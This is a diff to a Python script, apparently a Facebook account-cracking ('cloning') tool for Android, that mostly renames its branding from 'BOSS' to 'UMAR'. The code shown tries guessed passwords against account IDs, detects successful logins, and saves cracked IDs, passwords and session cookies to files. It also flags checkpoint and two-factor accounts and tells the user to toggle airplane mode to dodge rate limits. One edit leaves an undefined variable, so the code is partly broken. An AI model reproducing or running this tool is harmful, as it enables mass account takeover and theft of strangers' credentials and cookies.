@@ -309,7 +309,7 @@ key = 'true'
 while key == 'true':
     username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
     if username == CorrectUsername:
-            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN BOSS TOOL SUCCESSFULLY') 
+            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN UMAR TOOL SUCCESSFULLY') 
             time.sleep(1)
             clear()
             key = 'false'
@@ -453,7 +453,7 @@ def pak():
                         print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                         print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                         print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
-                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
+                        print('\033[0;97m[•]\x1b[1;92m UMAR TOOL CRACKING HAS BEEN STARTED')
                         linex() 
                         print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                         linex()
@@ -557,7 +557,7 @@ def bd():
 #_________[ METHOD 1 ]______>>  
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-M1\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mUMAR-M1\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -599,12 +599,12 @@ def ffb(ids,names,passlist):
                         if "c_user" in BOSS:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\x1b[1;92m[\033[0;97mBOSS-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
-                                open('/sdcard/BOSS-OK.txt', 'a').write(ids+'|'+pas+'\n')
-                                open('/sdcard/BOSS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
+                                print(f'\r\r\x1b[1;92m[\033[0;97mUMAR-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
+                                open('/sdcard/UMAR-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/UMAR-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in BOSS:
+                        elif 'checkpoint' in UMAR:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[1;92m[\033[0;91mUMAR-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                         open('/sdcard/UMAR-CP.txt', 'a').write(ids+'|'+pas+'\n')
@@ -624,7 +624,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop,proxies
-                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-M2\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mUMAR-M2\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -685,18 +685,18 @@ def api(ids,names,passlist):
                                 if 'session_key' in q:
                                         coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                         print('\r\33[1;92m[\033[0;97mUMAR-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
-                                        open('/sdcard/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        open('/sdcard/BOSS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/UMAR-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/UMAR-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                         oks.append(ids)
                                 elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r\33[1;97m[\033[1;92mBOSS-2F\033[1;97m]\033[1;92m '+ids+' | '+pas)
+                                                print('\r\r\33[1;97m[\033[1;92mUMAR-2F\033[1;97m]\033[1;92m '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break                   
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
                                                 print('\r\r\x1b[1;92m[\033[0;91mUMAR-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
-                                                open('/sdcard/BOSS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/UMAR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -710,7 +710,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop,proxies
-                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-M3\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mUMAR-M3\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -781,7 +781,7 @@ def api1(ids,names,passlist):
                                                 break           
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;92m[\033[0;91mUMAR-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                 open('/sdcard/UMAR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -854,14 +854,14 @@ def rndm(ids,passlist):
                                                 if uid in okk:pass
                                                 else:
                                                         coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                                                        print('\r\r\x1b[1;92m[\033[0;97mBOSS-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
+                                                        print('\r\r\x1b[1;92m[\033[0;97mUMAR-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                         #print("Cookie: "+coki)
                                                         open('/sdcard/UMAR-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         open('/sdcard/UMAR-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;92m[\033[0;91mUMAR-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
                                                 open('/sdcard/ZUMAR-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
